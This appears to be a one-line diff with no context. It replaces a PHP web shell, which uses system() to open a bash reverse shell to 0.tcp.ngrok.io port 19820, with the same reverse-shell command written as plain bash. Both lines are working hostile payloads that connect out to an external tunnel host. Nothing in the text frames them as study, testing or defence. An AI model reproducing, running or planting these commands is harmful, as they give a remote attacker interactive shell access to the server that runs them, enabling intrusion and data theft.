@@ -1,1 +1,1 @@
-<?php system("bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/19820 0>&1'"); ?>
+bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/19820 0>&1'
